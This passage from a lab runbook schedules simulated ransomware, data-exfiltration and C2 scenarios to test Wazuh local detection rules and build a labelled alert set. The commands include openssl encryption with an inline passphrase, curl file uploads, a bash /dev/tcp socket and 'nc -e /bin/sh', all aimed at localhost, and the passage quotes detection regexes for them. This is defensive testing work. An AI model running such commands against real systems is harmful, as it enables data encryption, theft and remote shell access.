| `100301` | "Possible ransomware: non-interactive symmetric encryption via $(audit.exe)." | `ransomware` (mitre, `T1486` exact) | `conf/local_rules.xml` (repo, quoted above); DEC-068 confirms the file is loaded on the manager (§0); resolver: `resolve(["T1486"], ["local","audit","ransomware"], None, 0).category == "ransomware"`; logtest transcript captured pre-rebuild in `docs/wazuh-manager-changes.md` §5 item 2 (`openssl enc -aes-256-cbc -pbkdf2 -k S0meP4ss …` → `id: '100301'`, `mitre.id: ['T1486']`) |

**Expected label:** `escalate`.

#### Benign twin

The rule's own stated benign case — the same tool, prompted instead of scripted:

```bash
openssl enc -aes-256-cbc -salt -in /tmp/lab/plain.txt -out /tmp/lab/plain2.enc   # no -k: interactive prompt
```

**Expected rule:** none — no passphrase on the command line means the `<match>` never fires; this
is exactly the interactive-admin case `docs/wazuh-manager-changes.md` §5 item 5 already proved
falls through to stock `80700` ("Audit: Messages grouped", level 0, no alert).

**Start:** `__:__:__` (+07:00)   **End:** `__:__:__` (+07:00)

**Expected label:** `benign` / `false_positive`.

#### Negative check

**Before:** `curl -s --cacert "$INDEXER_CA" -u "$INDEXER_USER:$INDEXER_PASSWORD" "$INDEXER_URL/wazuh-alerts-*/_count" -H 'Content-Type: application/json' -d '{"query":{"term":{"rule.id":"100301"}}}'` → record the count.
**After** the benign twin above: re-run the same command.

**Expected:** the count is **unchanged**. A test that requires a `pass`/`k`/`kfile` flag before it
fires must stay silent on the one command that omits it — that is the whole point of authoring the
rule as a behavioural property (§3's header comment) rather than as "`openssl` ran".

---

### data_exfiltration

> Local rule `100302`. Playbook: `data_exfiltration_v1`. Reachable only through the local rule — DEC-056 amendment 3
> applies here too.

#### Attack

```bash
curl --max-time 2 -T /tmp/lab/plain.txt http://127.0.0.1:9/
curl --max-time 2 -F 'f=@/tmp/lab/plain.txt' http://127.0.0.1:9/
```

Port 9 (discard) refuses the connection on this host — the point is the execve auditd records, not
a successful transfer.

**Expected rule:** `100302` — matches
`a\d+="(?:-T|--upload-file)"|a\d+="--post-file|a\d+="(?:-F|--form|-d|--data|--data-binary|--data-raw)".*a\d+="[^"]*@/`:
the first `curl` line matches `-T`, the second matches `-F` with a `@`-prefixed local path. **Not**
`100301`/`100303` — `curl`'s `audit.exe` never matches `openssl`/`gpg`/`nc`/`bash`.

**Indexer check:**
```bash
curl -s --cacert "$INDEXER_CA" -u "$INDEXER_USER:$INDEXER_PASSWORD" \
  "$INDEXER_URL/wazuh-alerts-*/_count" -H 'Content-Type: application/json' \
  -d "{\"query\":{\"bool\":{\"must\":[{\"term\":{\"rule.id\":\"100302\"}},{\"range\":{\"@timestamp\":{\"gte\":\"$S\",\"lte\":\"$E\"}}}]}}}"
```

**Start:** `__:__:__` (+07:00)   **End:** `__:__:__` (+07:00)

**Tag it (§2 step 7):** `PYTHONPATH=backend python3 eval/lab_tag.py --agent attt-m1-lab --since "$S" --until "$E" --scenario DX-A<n> --category data_exfiltration --kind attack --env-file .env`

#### Expected rules

| id | description (as authored) | resolves to | verified how |
|---|---|---|---|
| `100302` | "Possible data exfiltration: local file uploaded via $(audit.exe)." | `data_exfiltration` (mitre, `T1041` exact — tier 1 wins before the `exfiltration` group is even consulted) | `conf/local_rules.xml` (repo); resolver: `resolve(["T1041"], ["local","audit","exfiltration"], None, 0).category == "data_exfiltration"`; logtest transcript pre-rebuild in `docs/wazuh-manager-changes.md` §5 item 3 (`curl --max-time 2 -T victim.dat http://127.0.0.1:9/` → `id: '100302'`, `mitre.id: ['T1041']`) |

**Expected label:** `escalate`.

#### Benign twin

```bash
curl --max-time 2 -s -o /dev/null http://127.0.0.1:9/x   # a download — the opposite direction
```

**Expected rule:** none — `docs/wazuh-manager-changes.md` §5 item 5 already proved this exact
download command falls through to `80700`, level 0.

**Start:** `__:__:__` (+07:00)   **End:** `__:__:__` (+07:00)

**Expected label:** `benign` / `false_positive`.

#### Negative check

**Before:** `curl -s --cacert "$INDEXER_CA" -u "$INDEXER_USER:$INDEXER_PASSWORD" "$INDEXER_URL/wazuh-alerts-*/_count" -H 'Content-Type: application/json' -d '{"query":{"term":{"rule.id":"100302"}}}'` → record the count.
**After** the benign twin above: re-run the same command.

**Expected:** the count is **unchanged** — a download never matches the upload-shaped `<match>`.

---

### c2_beacon

> Local rule `100303`. Playbook: `c2_beacon_v1`. Reachable only through the local rule — DEC-056 amendment 3 applies
> here too, and the rule's own docstring is explicit that it detects **channel setup**, not
> beaconing periodicity (§7 repeats this for the report).

#### Attack

```bash
bash -c 'exec 3<>/dev/tcp/127.0.0.1/9'
nc -h 2>&1 | grep -q -- '-e' && nc -e /bin/sh 127.0.0.1 9   # only if this nc build has -e
```

**Expected rule:** `100303` — the `bash` line matches the rule's **hex branch**, not its plain-text
one: auditd hex-encodes any execve argument containing a shell metacharacter, so `/dev/tcp/127.0.0.1/9`
is recorded as `2F6465762F7463702F...`, and it is
`(?:a\d+=|proctitle=)[0-9A-F]*2F6465762F(?:7463|7564)702F` that matches, never the plain-text
alternative in the same `<match>` — `conf/local_rules.xml`'s own comment on `100303` explains this
was found by running the command, not by reading the rule. The `nc -e` line (run only when the
local build supports `-e`, tested first — most distributions compile it out) matches the third
alternative, `exe="…/(?:nc|…)".*a\d+="(?:-e|…)"`. **Not** `100301`/`100302` — neither `bash` nor
`nc` is `openssl`/`gpg`/`curl`/`wget`.

**Indexer check:**
```bash
curl -s --cacert "$INDEXER_CA" -u "$INDEXER_USER:$INDEXER_PASSWORD" \
  "$INDEXER_URL/wazuh-alerts-*/_count" -H 'Content-Type: application/json' \
  -d "{\"query\":{\"bool\":{\"must\":[{\"term\":{\"rule.id\":\"100303\"}},{\"range\":{\"@timestamp\":{\"gte\":\"$S\",\"lte\":\"$E\"}}}]}}}"
```

**Start:** `__:__:__` (+07:00)   **End:** `__:__:__` (+07:00)

**Tag it (§2 step 7):** `PYTHONPATH=backend python3 eval/lab_tag.py --agent attt-m1-lab --since "$S" --until "$E" --scenario C2-A<n> --category c2_beacon --kind attack --env-file .env`

#### Expected rules

| id | description (as authored) | resolves to | verified how |
|---|---|---|---|
| `100303` | "Possible C2 channel: shell attached to a network socket." | `c2_beacon` (mitre, `T1071` exact) | `conf/local_rules.xml` (repo); resolver: `resolve(["T1071"], ["local","audit","c2_beacon"], None, 0).category == "c2_beacon"`; logtest transcript pre-rebuild in `docs/wazuh-manager-changes.md` §5 item 4 (`bash -c 'exec 3<>/dev/tcp/127.0.0.1/9'` → `id: '100303'`, `mitre.id: ['T1071']`, hex argv confirmed) |

**Expected label:** `escalate`.

#### Benign twin

```bash
nc -z -w1 127.0.0.1 22    # a port check, no -e — no shell attached
```

**Expected rule:** none — `docs/wazuh-manager-changes.md` §5 item 5 already proved this exact
command falls through to `80700`, level 0.

**Start:** `__:__:__` (+07:00)   **End:** `__:__:__` (+07:00)

**Expected label:** `benign` / `false_positive`.

#### Negative check

**Before:** `curl -s --cacert "$INDEXER_CA" -u "$INDEXER_USER:$INDEXER_PASSWORD" "$INDEXER_URL/wazuh-alerts-*/_count" -H 'Content-Type: application/json' -d '{"query":{"term":{"rule.id":"100303"}}}'` → record the count.
**After** the benign twin above: re-run the same command.

**Expected:** the count is **unchanged** — a bare port check never attaches a shell, so neither the
hex branch nor the plain-text branch of the `<match>` fires.

## 4 · The benign block

Run **once per day** (`BB-D1` on 26/09, `BB-D2` on 27/09), each **≤ 10 minutes**, as its own
`--kind benign --category benign` window — `docs/chot-v3-14-ngay.md` §A2's benign activity on the
same host, run deliberately so the labellers never learn "lab host = escalate" from hostname alone.
**Keep it short on purpose:** the benign block declares no Expected rules, so by DEC-114 it is the
one unscoped window — *every* head of `attt-m1-lab` inside it becomes a `benign` truth row, including
the container hosts' background that happens to land in the window. A short window bounds how much of
that background enters G2 while still yielding benign clusters. Give the admin login its own `srcip`
from the rotation (§3) so it does not merge with an attack window's ssh key.

```bash
sudo apt update && sudo apt -s upgrade   # package listing / simulated upgrade — no state change forced
crontab -l                                # inspect the existing cron jobs (read-only, generates its own log line)
ssh -b "$SRC" -o PreferredAuthentications=password -o PubkeyAuthentication=no \
    -o StrictHostKeyChecking=no -o NumberOfPasswordPrompts=3 -o ConnectTimeout=5 \
    user1@127.0.0.1 true                  # admin login, correct password first try
ssh-keyscan -T2 127.0.0.1                 # self scan
```

**Expected rules:** `5715`/`5501` (the admin login), `2701`/`2930`-class apt/dpkg noise, whatever
`crontab -l` triggers (recorded in the checklist notes, not predicted), and a single `5706`/none
from the self scan — this window's alerts "resolve to whatever they resolve to" (design note 1);
that is why it is tagged `--category benign` rather than one specific category. Together with this
host's own ~34 alerts/hour of noise falling inside the window, this is where most of the ≥ 20
benign lab clusters (§ floor, `docs/lab-run-log.md` §"The floor to reach") come from.

**Start:** `__:__:__` (+07:00)   **End:** `__:__:__` (+07:00) — one line per day, two total.

**Tag it (§2 step 7):** `PYTHONPATH=backend python3 eval/lab_tag.py --agent attt-m1-lab --since "$S" --until "$E" --scenario BB-D<n> --category benign --kind benign --env-file .env`

## 5 · The two-day schedule

Interleaved, not batched (DEC-111). The cluster key is `(rule_id, srcip, dstip, agent_name)` and
`IDLE_GAP` is 15 min (`00-context-pack.md` §5), so the schedule earns a new cluster two ways: an
**ssh-based** window takes a fresh `srcip` from §3's rotation (a new key with no waiting), and a
**non-ssh** window (sudo `5401/5402`, rootcheck `510/521`, ClamAV `52502`, audit `100301`–`100303`)
waits ≥ 20 min since the last window of its category. Running the eight categories round-robin at an
8-minute cadence puts ~64 min between same-category windows, so the non-ssh spacing is free. The
rules, restated as the schedule keeps them:

- **(a)** Day 1 opens with the three audit scenarios RW-A1, DX-A1, C2-A1 (rows 1–3), in that order
  — the only proof `100301`/`100302`/`100303` still fire under DEC-113's `auid` filter. After each,
  read the rule-scoped count
  (§3) before going on; **if it is 0, the `auid` filter is the first suspect** (DEC-113), and §1
  check 4 is where you look.
- **(b)** Two windows that could share a cluster key start ≥ 20 min apart. ssh-based windows avoid
  this by rotating `srcip`; non-ssh windows rely on the cadence.
- **(c)** A benign twin that shares rule ids with its attack (`SBF`/`SL`'s `5760/5503`, `PE`'s
  `5402`) takes a different `srcip` or starts ≥ 20 min after that attack.
- **(d)** No window overlaps another (§2 step 5; `build_gold.py --g2` exits 3 on an overlap).
- **(e)** Ids are unique, match `^[A-Za-z0-9_-]{1,16}$`, and use the prefixes SBF, SL, PE, RC, MW,
  RW, DX, C2, BB with the suffix -A*n* (attack), -B*n* (twin), -D*n* (benign block).

**Day 1 — 2026-09-26 (+07:00), interleaved, 8-minute cadence.**

| # | category | kind | scenario_id | planned start (+07:00) | srcip | notes |
|---|---|---|---|---|---|---|
| 1 | ransomware | attack | `RW-A1` | 07:05 | n/a — space ≥20 min | run first; check the rule-scoped count before continuing (DEC-113) |
| 2 | data_exfiltration | attack | `DX-A1` | 07:13 | n/a — space ≥20 min | run first; check the rule-scoped count before continuing (DEC-113) |
| 3 | c2_beacon | attack | `C2-A1` | 07:21 | n/a — space ≥20 min | run first; check the rule-scoped count before continuing (DEC-113) |
| 4 | ssh_brute_force | attack | `SBF-A1` | 07:29 | 127.0.0.1 |  |
| 5 | suspicious_login | attack | `SL-A1` | 07:37 | 127.0.0.1 |  |
| 6 | privilege_escalation | attack | `PE-A1` | 07:45 | n/a — space ≥20 min |  |
| 7 | recon | attack | `RC-A1` | 07:53 | 127.0.0.1 |  |
| 8 | malware | attack | `MW-A1` | 08:01 | n/a — space ≥20 min |  |
| 9 | ransomware | attack | `RW-A2` | 08:09 | n/a — space ≥20 min |  |
| 10 | data_exfiltration | attack | `DX-A2` | 08:17 | n/a — space ≥20 min |  |
| 11 | c2_beacon | attack | `C2-A2` | 08:25 | n/a — space ≥20 min |  |
| 12 | ssh_brute_force | attack | `SBF-A2` | 08:33 | 127.0.0.2 |  |
| 13 | suspicious_login | attack | `SL-A2` | 08:41 | 127.0.0.2 |  |
| 14 | privilege_escalation | attack | `PE-A2` | 08:49 | n/a — space ≥20 min |  |
| 15 | recon | attack | `RC-A2` | 08:57 | 127.0.0.2 |  |
| 16 | malware | attack | `MW-A2` | 09:05 | n/a — space ≥20 min |  |
| 17 | ransomware | attack | `RW-A3` | 09:13 | n/a — space ≥20 min |  |
| 18 | data_exfiltration | attack | `DX-A3` | 09:21 | n/a — space ≥20 min |  |
| 19 | c2_beacon | attack | `C2-A3` | 09:29 | n/a — space ≥20 min |  |
| 20 | ssh_brute_force | attack | `SBF-A3` | 09:37 | 127.0.0.3 |  |
| 21 | suspicious_login | attack | `SL-A3` | 09:45 | 127.0.0.3 |  |
| 22 | privilege_escalation | attack | `PE-A3` | 09:53 | n/a — space ≥20 min |  |
| 23 | recon | attack | `RC-A3` | 10:01 | 127.0.0.3 |  |
| 24 | malware | attack | `MW-A3` | 10:09 | n/a — space ≥20 min |  |
| 25 | ransomware | attack | `RW-A4` | 10:17 | n/a — space ≥20 min |  |
| 26 | data_exfiltration | attack | `DX-A4` | 10:25 | n/a — space ≥20 min |  |
| 27 | c2_beacon | attack | `C2-A4` | 10:33 | n/a — space ≥20 min |  |
| 28 | ssh_brute_force | attack | `SBF-A4` | 10:41 | 127.0.0.4 |  |
| 29 | suspicious_login | attack | `SL-A4` | 10:49 | 127.0.0.4 |  |
| 30 | privilege_escalation | attack | `PE-A4` | 10:57 | n/a — space ≥20 min |  |
| 31 | recon | attack | `RC-A4` | 11:05 | 127.0.0.4 |  |
| 32 | malware | attack | `MW-A4` | 11:13 | n/a — space ≥20 min |  |
| 33 | ransomware | attack | `RW-A5` | 11:21 | n/a — space ≥20 min |  |
| 34 | data_exfiltration | attack | `DX-A5` | 11:29 | n/a — space ≥20 min |  |
| 35 | c2_beacon | attack | `C2-A5` | 11:37 | n/a — space ≥20 min |  |
| 36 | ssh_brute_force | attack | `SBF-A5` | 11:45 | 127.0.0.5 |  |
| 37 | suspicious_login | attack | `SL-A5` | 11:53 | 127.0.0.5 |  |
| 38 | **benign** | benign | `BB-D1` | 12:01 | `127.0.0.30` | §4 benign block, ≤10 min |

**Day 2 — 2026-09-27 (+07:00), interleaved, 8-minute cadence.**

| # | category | kind | scenario_id | planned start (+07:00) | srcip | notes |
|---|---|---|---|---|---|---|
| 1 | privilege_escalation | attack | `PE-A5` | 07:05 | n/a — space ≥20 min |  |
| 2 | recon | attack | `RC-A5` | 07:13 | 127.0.0.5 |  |
| 3 | malware | attack | `MW-A5` | 07:21 | n/a — space ≥20 min |  |
| 4 | ransomware | attack | `RW-A6` | 07:29 | n/a — space ≥20 min |  |
| 5 | data_exfiltration | attack | `DX-A6` | 07:37 | n/a — space ≥20 min |  |
| 6 | c2_beacon | attack | `C2-A6` | 07:45 | n/a — space ≥20 min |  |
| 7 | ssh_brute_force | attack | `SBF-A6` | 07:53 | 127.0.0.6 |  |
| 8 | suspicious_login | attack | `SL-A6` | 08:01 | 127.0.0.6 |  |
| 9 | privilege_escalation | attack | `PE-A6` | 08:09 | n/a — space ≥20 min |  |
| 10 | recon | attack | `RC-A6` | 08:17 | 127.0.0.6 |  |
| 11 | malware | attack | `MW-A6` | 08:25 | n/a — space ≥20 min |  |
| 12 | ransomware | attack | `RW-A7` | 08:33 | n/a — space ≥20 min |  |
| 13 | data_exfiltration | attack | `DX-A7` | 08:41 | n/a — space ≥20 min |  |
| 14 | c2_beacon | attack | `C2-A7` | 08:49 | n/a — space ≥20 min |  |
| 15 | ssh_brute_force | attack | `SBF-A7` | 08:57 | 127.0.0.7 |  |
| 16 | suspicious_login | attack | `SL-A7` | 09:05 | 127.0.0.7 |  |
| 17 | privilege_escalation | attack | `PE-A7` | 09:13 | n/a — space ≥20 min |  |
| 18 | recon | attack | `RC-A7` | 09:21 | 127.0.0.7 |  |
| 19 | malware | attack | `MW-A7` | 09:29 | n/a — space ≥20 min |  |
| 20 | ransomware | benign | `RW-B1` | 09:37 | n/a — space ≥20 min | twin — distinct srcip / ≥20 min from its attack (constraint c) |
| 21 | data_exfiltration | benign | `DX-B1` | 09:45 | n/a — space ≥20 min | twin — distinct srcip / ≥20 min from its attack (constraint c) |
| 22 | c2_beacon | benign | `C2-B1` | 09:53 | n/a — space ≥20 min | twin — distinct srcip / ≥20 min from its attack (constraint c) |
| 23 | ssh_brute_force | attack | `SBF-A8` | 10:01 | 127.0.0.8 |  |
| 24 | suspicious_login | attack | `SL-A8` | 10:09 | 127.0.0.8 |  |
| 25 | privilege_escalation | benign | `PE-B1` | 10:17 | n/a — space ≥20 min | twin — distinct srcip / ≥20 min from its attack (constraint c) |
| 26 | recon | attack | `RC-A8` | 10:25 | 127.0.0.8 |  |
| 27 | malware | benign | `MW-B1` | 10:33 | n/a — space ≥20 min | twin — distinct srcip / ≥20 min from its attack (constraint c) |
| 28 | ssh_brute_force | attack | `SBF-A9` | 10:41 | 127.0.0.9 |  |
| 29 | suspicious_login | benign | `SL-B1` | 10:49 | 127.0.0.21 | twin — distinct srcip / ≥20 min from its attack (constraint c) |
| 30 | privilege_escalation | benign | `PE-B2` | 10:57 | n/a — space ≥20 min | twin — distinct srcip / ≥20 min from its attack (constraint c) |
| 31 | recon | benign | `RC-B1` | 11:05 | 127.0.0.21 | twin — distinct srcip / ≥20 min from its attack (constraint c) |
| 32 | ssh_brute_force | attack | `SBF-A10` | 11:13 | 127.0.0.10 |  |
| 33 | suspicious_login | benign | `SL-B2` | 11:21 | 127.0.0.22 | twin — distinct srcip / ≥20 min from its attack (constraint c) |
| 34 | recon | benign | `RC-B2` | 11:29 | 127.0.0.22 | twin — distinct srcip / ≥20 min from its attack (constraint c) |
| 35 | ssh_brute_force | benign | `SBF-B1` | 11:37 | 127.0.0.21 | twin — distinct srcip / ≥20 min from its attack (constraint c) |
| 36 | ssh_brute_force | benign | `SBF-B2` | 11:45 | 127.0.0.22 | twin — distinct srcip / ≥20 min from its attack (constraint c) |
| 37 | **benign** | benign | `BB-D2` | 11:53 | `127.0.0.30` | §4 benign block, ≤10 min |

#### Yield — the arithmetic behind the floors

In-scope clusters counted as distinct cluster keys among the **declared** Expected rules the
scenario's own text says fire (§3); anything else in a window is `in_window_unexpected` and excluded
(DEC-114), so it is not counted here. The negative-check twins `RW-B`, `DX-B`, `C2-B` and the
clean-scan `MW-B` yield **0 in-scope clusters by design** (their whole point is that the rule stays
silent), so they add nothing to the attack column and are the `0` twin rows below.

| category | attack windows | in-scope / window | attack clusters | twin windows | benign twin clusters |
|---|---|---|---|---|---|
| ransomware (`RW`) | 7 | 1 — 100301 (1); interactive twin 0 | 7 | 1 | 0 |
| data_exfiltration (`DX`) | 7 | 1 — 100302 (1); download twin 0 | 7 | 1 | 0 |
| c2_beacon (`C2`) | 7 | 1 — 100303 (1); port-check twin 0 | 7 | 1 | 0 |
| ssh_brute_force (`SBF`) | 10 | 2 — 5760/5503 (1) + 5712 burst (1) | 20 | 2 | 2 |
| suspicious_login (`SL`) | 8 | 2 — 40112 (1) + 5715 success (1) | 16 | 2 | 2 |
| privilege_escalation (`PE`) | 7 | 1 — 5401 attack / 5402 twin (1) | 7 | 2 | 2 |
| recon (`RC`) | 8 | 1 — 5731 (1) | 8 | 2 | 2 |
| malware (`MW`) | 7 | 1 — 52502 (1); clean-scan twin 0 | 7 | 1 | 0 |

- Attack in-scope clusters: **79** (sum of the attack-clusters column).
- Benign twin clusters: **8**; benign-block clusters: **10–24**,
  background-dependent (each block is unscoped by DEC-114, so its benign count is whatever real
  background lands in the ≤10-min window; **16** used as the planning mid-point).
- **in-scope clusters planned: 103** — attack 79 + benign (8 twin +
  16 block) = 103 ≥ 100.
- **benign clusters planned: 24** — 8 twin + 16 block ≥ 20.
- Categories covered: **8 of 8**. Windows: Day 1 38 (~5.1 h), Day 2 37 (~5.0 h), each
  within the 5–6 h budget.

If a category yields fewer clusters than planned (a rule that does not fire on this host, a `srcip`
that the sshd build does not honour — §3's fallback), record the shortfall in the checklist's notes
and in `docs/lab-run-log.md`; the coverage floor is checked for real by `build_gold.py` in §6, and a
genuine miss is a zero row, never a synthesised one (§0).

## 6 · After the last window (evening of 27/09)

G2 only — G1 is dropped (DEC-111), so there is no archive to read. Requires **P6-T07 merged into
`main`** (the G2-only build; if `--g2` still demands an archive input, P6-T07 is not in yet):

```bash
# from the primary checkout
PYTHONPATH=backend python3 eval/build_gold.py \
  --g2 --lab-windows eval/lab_windows.csv --g2-target 150 --g2-floor 100 \
  --env-file .env --out-dir eval
```

Read `eval/gold_coverage.md`:

- the **`in_window_unexpected`** column and its totals line — the background heads DEC-114 excluded,
  per window; a large number here is expected (the container hosts) and is not a failure;
- **G2 ≥ 100** in-scope clusters over the eight categories — a category that produced zero clusters
  is a **zero row**, printed as such, **never synthesised** (§0);
- the **benign ≥ 20** line;
- any window whose heads were not all tagged (a build error, not a silent drop).

Commit **only** `eval/gold_candidates.csv`, `eval/gold_coverage.md`, and `eval/lab_windows.csv` with
its now-populated rows (this runbook ships the file with its header only). **Do not** commit
`eval/g1_*` — the G1 record stays exactly as it is (DEC-111).

## 7 · What is deliberately not here

- **`web_attack`** — not for want of a web service: MISP's nginx and n8n both run on
  ATTT-M1. The reason is that **no rule on this manager maps to `web_attack`** after DEC-055's fix
  removed the `GROUP_TO_CATEGORY["attack"]` mis-mapping, so a scenario would classify nothing; and
  an attack aimed at one of the production service containers is outside the lab's bounds anyway
  (DEC-055, DEC-056).
- **`policy_violation`** — no Linux stock rule carries a fitting group and no local rule was
  authored for it; it has no signal at all, not a weak one (DEC-057, which decided it inside A5
  rather than here).
- **A shell spawned by a service account is not in scope, and that is a real detection gap.** Under
  DEC-113's `auid>=1000` filter, auditd does not record execve for a process with no login uid — a
  daemon, a container entrypoint, cron. So `100301`–`100303` cannot see a ransomware/exfil/C2 action
  taken *by* one of the container services, only one a logged-in operator takes. The G2 scenarios
  are unaffected (§0 rule 1 runs them from a login shell), but the gap is real and P8's
  `docs/limitations.md` carries it.
- **Suricata** — installing it classifies nothing on this estate: its five stock rules decode as
  `json`, carry no MITRE id and no mapped group, so `DECODER_TO_CATEGORY["suricata"]` can never
  match (INBOX `2026-09-08 · P6 / G2`; `docs/chot-v3-14-ngay.md` §A2's own warning, confirmed by
  construction rather than assumed).
- **The circularity in `ransomware`/`data_exfiltration`/`c2_beacon`, named plainly.** The behaviour
  these three scenarios generate is real, but the detection logic that classifies it —
  `conf/local_rules.xml`'s three rules — was written by the same person whose system this project
  evaluates (DEC-056 amendment 3). That is a defensible engineering trade-off on a single-operator
  estate, the same shape as the author-as-labeller control this project already names, but it is
  stated here rather than left as a runbook footnote, and the evaluation chapter (P8's
  `docs/limitations.md`) carries it forward for exactly these three categories.
